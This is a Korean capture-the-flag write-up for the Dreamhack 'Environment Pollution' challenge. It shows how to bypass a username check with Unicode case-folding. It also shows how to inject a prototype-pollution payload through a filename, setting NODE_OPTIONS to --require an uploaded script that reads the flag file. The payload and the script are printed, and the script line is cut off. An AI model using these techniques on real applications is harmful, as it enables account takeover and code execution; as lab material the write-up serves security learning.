# Environment Pollution
https://dreamhack.io/wargame/challenges/205

## Description
환경 오염이란 "동식물이나 인간의 생활환경이 악화되어 있는 상태"를 뜻 합니다. 대표적으로 북극에 서식하는 육식성 동물인 도지곰이 매우 큰 피해를 받고 있어요. 환경 오염 원인을 찾고, 이를 해결 할 대응책을 찾아주세요.

# Exploit

## korea_pocas Login
```js
app.get('/debug', function(req, res){
    const cook = req.cookies['user'];
    if (cook !== undefined){
        try{
            const information = jwt.verify(cook, SECRET);
            if (information['user'] == 'korea_pocas'){
                res.send(spawnSync(process.execPath, ['debug.js']).stdout.toString());
            } else {
                res.send("Debug mode off");
            }
        } catch (e) {
            res.status(401).json({ error: 'unauthorized' });
        }
    } else {
        try{
            res.send("You are not login..")
        } catch (e) {
            res.send("I don't know..")
        }
    }
})
```
Debug를 활성화시키려면 korea_pocas로 로그인을 해야한다.

```js
app.post('/register', (req, res) => {
    const name = req.body.name;
    const id = req.body.id;
    const pw = req.body.pw;
    const rpw = req.body.rpw;

    if (/[A-Z]/g.test(id) || id == 'korea_pocas') {
        res.send("This user is not allowed.").status(400);
    }
    else{
        const params = [name.toLowerCase(), id.toLowerCase(), func.sha256(pw.toLowerCase())];
        conn.query(mysql.format("insert into users(name, id, pw) values(?, ?, ?);", params), function(err, rows){
            if(err) { res.send(err);}
            else {res.redirect("/login");}
        });
}});
```
필요없는 코드를 삭제한 코드이다.

첫번째 if문에서 정규식과 korea_pocas로 걸러내서 korea_pocas로의 회원가입을 막는다.    
하지만 toLowerCase 취약점을 이용해서 쉽게 우회할 수 있다.

```bash
C:\Users\user>node
> a = "K"
'K'
> a.toLowerCase()
'k'
> a == 'K'
false
```

이런 특수문자들은 여기서 찾을 수 있다.    
https://www.compart.com/en/unicode/U+00ff


## Pollution
```js
exports.merge = function(a, b) {
  for (let key in b) {
    if(check(key)){
        if (isObject(a[key]) && isObject(b[key])) {
          this.merge(a[key], b[key]);
        } else {
          a[key] = b[key];
        }
    }
  }
  return a;
}
```
해당 서버에는 깊은복사를 구현한 merget함수가 있다.    

해당 함수는
```js
app.get('/raw/:filename', function(req, res){
    const file = {};
    const filename = req.params.filename;
    const filepath = `publics/uploads/${filename}`;

    try{
        func.getfile(mysql.format("select * from filelist where path = ?", filepath), function(err, data){
            if(err) {
                res.send(err);
            }
            else{
                if (data){
                    res.download(data.path);
                }else{
                    try{
                        func.merge(file, JSON.parse(`{"filename":"${filename}", "State":"Not Found"}`));
                        res.send(file);
                    } catch (e) {
                        res.send("I don't know..");
                    }
                }
            }
        });
    } catch (e) {
        res.send("I don't know..");
    }
});
```
이 파일 업로드 되는 api에서 사용된다.     
여기서 `filename` 이 `${}`으로 바로 들어가기 때문에 `"` 를 이용해서 SQLi처럼 프로토타입을 감염시킬 수 있다.

### hi.js
```
const fs=require("fs");const flag=fs.readFileSync("flag","utf-8");fs.writeFileSync("/app/publics/uploads/hi.js)
```
js파일을 작성하고 파일을 업로드하며 프록시 툴을 사용해서 `Content-type`을 `chose/javascript`로 수정한다.

-  파싱 로직이 chose/javascript로 개발자가 코딩해놨다.


### prototype pollution
```
","__proto__":{"NODE_OPTIONS":"--require .%2fpublics%2fuploads%2fhi.js"},"a":"a
```

proto 오염으로 인해 `/debug`에 접속하면 hi.js가 실행되면서 flag가 `/raw/hi.js`에서 얻을 수 있다.